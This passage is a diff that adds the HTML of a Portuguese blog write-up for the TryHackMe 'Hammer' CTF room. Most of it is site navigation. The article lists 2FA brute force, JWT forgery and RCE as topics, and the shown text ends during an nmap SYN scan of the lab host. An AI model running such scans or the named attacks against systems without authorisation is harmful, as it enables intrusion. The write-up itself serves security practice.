@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="pt" dir="ltr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" id="favicon-svg" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>Hammer – Alex Paulino</title>
+  <meta name="description" content="Introdução Este CTF faz parte da trilha Web Application Pentesting. Nele, são praticados conceitos de gerenciamento de sessão, autenticação de dois fatores (2FA), força bruta, scripting e JSON Web Tokens (JWT).
+Inicialmente, realizamos o reconhecimento da aplicação, suas portas e serviços. Em seguida, passamos para a enumeração da aplicação, analisando como ela se comporta no processo de recuperação de senha. Concluímos com a análise do JWT e a exposição de informações sensíveis." /><link rel="canonical" href="http://localhost:1313/posts/2025/2025-02-13-hammer/" itemprop="url" />
+
+<meta property="og:title" content="Hammer">
+<meta
+  property="og:description"
+  content="
+    
+      Introdução
+    Este CTF faz parte da trilha Web Application Pentesting. Nele, são praticados conceitos de gerenciamento de sessão, autenticação de dois fatores (2FA), força bruta, scripting e JSON Web Tokens (JWT).
+Inicialmente, realizamos o reconhecimento da aplicação, suas portas e serviços. Em seguida, passamos para a enumeração da aplicação, analisando como ela se comporta no processo de recuperação de senha. Concluímos com a análise do JWT e a exposição de informações sensíveis.
+    
+  ">
+<meta
+  property="og:type"
+  content="
+    article
+  ">
+<meta property="og:url" content="http://localhost:1313/posts/2025/2025-02-13-hammer/"><meta property="article:section" content="posts">
+
+<meta
+  property="article:published_time"
+  content="2025-02-13T19:00:00-03:00">
+
+
+<meta
+  property="article:modified_time"
+  content="2025-02-13T19:00:00-03:00">
+
+
+
+	<meta itemprop="name" content="Hammer">
+	<meta itemprop="description" content="Introdução Este CTF faz parte da trilha Web Application Pentesting. Nele, são praticados conceitos de gerenciamento de sessão, autenticação de dois fatores (2FA), força bruta, scripting e JSON Web Tokens (JWT).
+Inicialmente, realizamos o reconhecimento da aplicação, suas portas e serviços. Em seguida, passamos para a enumeração da aplicação, analisando como ela se comporta no processo de recuperação de senha. Concluímos com a análise do JWT e a exposição de informações sensíveis.">
+	<meta itemprop="datePublished" content="2025-02-13T19:00:00-03:00">
+	<meta itemprop="dateModified" content="2025-02-13T19:00:00-03:00">
+	<meta itemprop="wordCount" content="2034">
+	<meta itemprop="keywords" content="Web,Brute Force,Mfa,2fa,Jwt,Cookie,Rce">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Hammer">
+	<meta name="twitter:description" content="Introdução Este CTF faz parte da trilha Web Application Pentesting. Nele, são praticados conceitos de gerenciamento de sessão, autenticação de dois fatores (2FA), força bruta, scripting e JSON Web Tokens (JWT).
+Inicialmente, realizamos o reconhecimento da aplicação, suas portas e serviços. Em seguida, passamos para a enumeração da aplicação, analisando como ela se comporta no processo de recuperação de senha. Concluímos com a análise do JWT e a exposição de informações sensíveis.">
+<link href="/css/compiled/main.css" rel="stylesheet" />
+    <link href="/css/variables.css" rel="stylesheet" />
+    <link href="/css/custom.css" rel="stylesheet" />
+
+  
+<script src="/js/main-head.js" integrity=""></script>
+
+  
+  
+  </head>
+<body>
+    <a href="#content" class="hx:sr-only hx:focus-visible:not-sr-only hx:focus-visible:fixed hx:focus-visible:z-50 hx:focus-visible:top-2 hx:focus-visible:left-2 hx:focus-visible:bg-primary-500 hx:focus-visible:text-white hx:focus-visible:px-4 hx:focus-visible:py-2 hx:focus-visible:rounded-md hx:focus-visible:text-sm hx:focus-visible:font-medium">Saltar para o conteúdo</a><div class="hextra-nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div
+    class="hextra-nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"
+  ></div>
+
+  <nav class="hextra-max-navbar-width hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-1 hx:md:gap-2 hx:h-[var(--hextra-navbar-height)] hx:px-6">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+    <img class="hx:mr-2 hx:block hx:dark:hidden" src="/images/logo.svg" alt="Logo" height="20" width="20" />
+    <img class="hx:mr-2 hx:hidden hx:dark:block" src="/images/logo.svg" alt="Dark Logo" height="20" width="20" />
+    <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none">Alex Paulino</span>
+</a>
+<button
+    type="button"
+    class="hextra-search-trigger"
+    data-search-open
+    aria-haspopup="dialog"
+    aria-controls="hextra-search-dialog"
+    aria-label="Procurar..."
+  ><svg class="hextra-search-trigger-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><span class="hextra-search-trigger-label">Procurar...</span>
+    <kbd class="hextra-search-trigger-kbd">CTRL K</kbd>
+  </button><a
+  title=""
+  href="/about/"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Sobre</span>
+</a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://github.com/alxpas" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx:sr-only">GitHub</span>
+          </a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/alexpaulino/" title="LinkedIn"><svg height=24 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037c-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85c3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065a2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span class="hx:sr-only">LinkedIn</span>
+          </a><button type="button" aria-label="Menu" aria-expanded="false" class="hextra-hamburger-menu hx:cursor-pointer hx:-mr-1 hx:rounded-sm hx:p-1 hx:active:bg-gray-400/20 hx:md:hidden hx:hextra-focus-visible-inset"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx:mx-auto hx:flex hextra-max-page-width">
+    <aside class="hextra-sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-[var(--hextra-navbar-height)] hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:hidden hx:xl:block">
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--hextra-navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      <li><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/about/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Sobre</span>
+    </a>
+  </div></li>
+    </ul>
+
+    <div class="hx:max-xl:hidden hx:h-0 hx:w-64 hx:shrink-0"></div></div>
+  
+  
+    <div class="hx:md:hidden hx:justify-end hx:sticky hx:bottom-0 hx:max-h-(--menu-height) hx:bg-white hx:dark:bg-dark hx:mx-4 hx:py-4 hx:shadow-[0_-12px_16px_#fff] hx:flex hx:items-center hx:gap-2 hx:border-gray-200 hx:dark:border-neutral-800 hx:dark:shadow-[0_-12px_16px_#111] hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:shadow-none hx:border-t" data-toggle-animation="show"><div class="hx:flex hx:justify-items-start hx:grow">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-02-13-hammer/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom-right"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+</div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div></aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="Índice">
+    <div class="hextra-scrollbar hx:sticky hx:top-[var(--hextra-navbar-height)] hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--hextra-navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">Nesta página</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#introdu%c3%a7%c3%a3o">Introdução
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#reconhecimento">Reconhecimento
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#explora%c3%a7%c3%a3o">Exploração
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#brute-force---2fa">Brute Force - 2FA
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#jwt">JWT
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#criando-nosso-jwt">Criando nosso JWT
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#resumo">Resumo
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#complemento">Complemento
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#fun%c3%a7%c3%a3o-para-realizar-o-logout-automaticamente">Função para realizar o logout automaticamente
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#controle-contra-brute-force">Controle contra Brute Force
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#otp-gerado">OTP gerado
+        </a>
+      </li></ul>
+      <div class="hx:mt-8 hx:border-t hx:bg-white hx:pt-8 hx:shadow-[0_-12px_16px_white] hx:dark:bg-dark hx:dark:shadow-[0_-12px_16px_#111] hx:sticky hx:bottom-0 hx:flex hx:flex-col hx:items-start hx:gap-2 hx:pb-8 hx:border-gray-200 hx:dark:border-neutral-800 hx:contrast-more:border-t hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:border-neutral-400">
+        <button id="backToTop" tabindex="-1" class="hx:cursor-pointer hx:transition-all hx:duration-75 hx:opacity-0 hx:text-xs hx:font-medium hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-100 hx:contrast-more:text-gray-800 hx:contrast-more:dark:text-gray-50">
+          <span>Voltar ao topo</span>
+          <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" focusable="false" class="hx:inline hx:ltr:ml-1 hx:rtl:mr-1 hx:h-3.5 hx:w-3.5 hx:rounded-full hx:border hx:border-gray-500 hx:hover:border-gray-900 hx:dark:border-gray-400 hx:dark:hover:border-gray-100 hx:contrast-more:border-gray-800 hx:contrast-more:dark:border-gray-50">
+            <path stroke-linecap="round" stroke-linejoin="round" d="M4.5 15.75l7.5-7.5 7.5 7.5" />
+          </svg>
+        </button>
+      </div>
+    </div>
+  </nav>
+
+
+    <article class="hx:w-full hx:break-words hx:flex hx:min-h-[calc(100vh-var(--hextra-navbar-height))] hx:min-w-0 hx:justify-center hx:pb-8 hx:pr-[calc(env(safe-area-inset-right)-1.5rem)]">
+      <main id="content" class="hx:w-full hx:min-w-0 hextra-max-content-width hx:px-6 hx:pt-4 hx:md:px-12">
+        
+        
+        <br class="hx:mt-1.5 hx:text-sm" />
+        <h1 class="hx:text-center hx:mt-2 hx:text-4xl hx:font-bold hx:tracking-tight hx:text-slate-900 hx:dark:text-slate-100">Hammer</h1>
+        <div class="hx:mb-16"></div>
+        <div class="content">
+          
+          <h2 data-hextra-search-id="introdução">Introdução<span class="hx:absolute hx:-mt-20" id="introdução"></span>
+    <a href="#introdu%c3%a7%c3%a3o" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Este CTF faz parte da trilha <strong>Web Application Pentesting</strong>. Nele, são praticados conceitos de gerenciamento de sessão, autenticação de dois fatores (2FA), força bruta, scripting e JSON Web Tokens (JWT).</p>
+<p>Inicialmente, realizamos o reconhecimento da aplicação, suas portas e serviços. Em seguida, passamos para a enumeração da aplicação, analisando como ela se comporta no processo de recuperação de senha. Concluímos com a análise do JWT e a exposição de informações sensíveis.</p>
+<p>O CTF se encontra <a
+    href="https://tryhackme.com/room/hammer"target="_blank" rel="noopener">neste link.</a></p>
+<h2 data-hextra-search-id="reconhecimento">Reconhecimento<span class="hx:absolute hx:-mt-20" id="reconhecimento"></span>
+    <a href="#reconhecimento" class="subheading-anchor" aria-label="Link permanente para esta secção"></a></h2><p>Executamos um SYN SCAN no alvo.</p>
+<div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code">
+
+<div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿estudos<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/alex<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nmap -Pn -sS --open 10.10.19.190            
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-10 15:59 -03
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> hammer.thm <span style="color:#f92672">(</span>10.10.19.190<span style="color:#f92672">)</span>
